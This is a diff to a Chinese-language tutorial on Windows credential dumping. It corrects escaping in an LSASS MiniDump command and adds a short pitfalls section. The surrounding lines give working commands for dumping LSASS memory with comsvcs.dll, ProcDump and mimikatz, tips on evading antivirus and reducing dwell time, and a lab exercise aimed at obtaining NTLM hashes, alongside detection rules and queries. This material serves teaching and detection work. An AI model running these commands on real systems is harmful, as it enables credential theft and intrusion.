@@ -159,7 +159,7 @@ graph TD
 ### 实战技巧
 
 1. **优先使用LOLBins（寄生二进制文件）**
-   使用Windows自带工具（如comsvcs.dll）转储LSASS，避免投放第三方工具触发杀毒软件告警。命令：`rundll32.exe comsvcs.dll, MiniDump &lt;PID&gt; dump.bin full`
+   使用Windows自带工具（如comsvcs.dll）转储LSASS，避免投放第三方工具触发杀毒软件告警。命令：`rundll32.exe comsvcs.dll, MiniDump <PID> dump.bin full`
 
 2. **离线解析减少停留时间**
    在目标上只做转储操作，将dmp文件下载到攻击机后使用mimikatz的`sekurlsa::minidump`离线解析，减少在目标系统上的活跃时间。
@@ -210,6 +210,10 @@ graph TD
 - 监控Event ID 4662中来自非域控制器的DS-Replication-Get-Changes请求
 - 设置告警规则：任何使用rundll32执行comsvcs.dll MiniDump的行为
 
+## 避坑指南
+
+组织中最危险盲区：认为强密码就足够安全。
+
 ## 检测建议
 
 ### 网络层检测
@@ -237,9 +241,6 @@ Zeek检测规则：dce_rpc 且 operation = DsGetNCChanges
 Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=10} | 
     Where-Object { $_.Properties[15].Value -like '*lsass.exe' }
 ```
-
-
-
 
 **用人话说：** 这条规则在监控是否有进程在读取系统内存中的密码哈希。Windows/Linux系统会把登录用户的密码哈希缓存在内存中，方便快速认证。正常情况下只有系统进程会读取这些内存区域。如果有陌生进程试图读取凭证存储区域，那就是攻击者在'倒'系统内存中的密码哈希。
 
@@ -335,7 +336,7 @@ Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-L
 1. 在Windows VM中以管理员身份打开命令提示符
 2. 方法1（mimikatz）：`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
 3. 方法2（ProcDump）：`procdump.exe -accepteula -ma lsass.exe lsass.dmp`
-4. 方法3（comsvcs.dll）：`rundll32.exe comsvcs.dll, MiniDump &lt;PID&gt; dump.bin full`
+4. 方法3（comsvcs.dll）：`rundll32.exe comsvcs.dll, MiniDump <PID> dump.bin full`
 5. 使用方法2的dmp文件，在攻击机上使用mimikatz离线解析
 
 **预期结果：** 获取当前登录用户的NTLM哈希
